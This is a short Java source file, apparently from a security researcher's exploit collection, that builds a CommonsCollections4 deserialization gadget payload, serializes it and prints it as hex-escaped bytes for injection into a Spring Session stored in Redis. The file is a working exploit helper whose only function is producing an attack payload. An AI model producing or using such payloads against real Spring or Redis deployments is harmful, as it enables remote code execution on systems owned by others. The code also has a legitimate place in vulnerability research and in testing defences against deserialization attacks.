package me.threedr3am.bug.spring.redis.session;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

/**
 * @author threedr3am
 */
public class Main {

    public static void main(String[] args) throws Exception {
        Object payload = CommonCollections4.getPayload();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(payload);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < bytes.length; i++) {
            byte tmp = bytes[i];
            stringBuilder.append("\\x");
            stringBuilder.append(String.format("%02X", tmp));
        }
        System.out.println(stringBuilder.toString());
    }

    // \xAC\xED\x00\x05t\x00\x0Athreedr3am
}
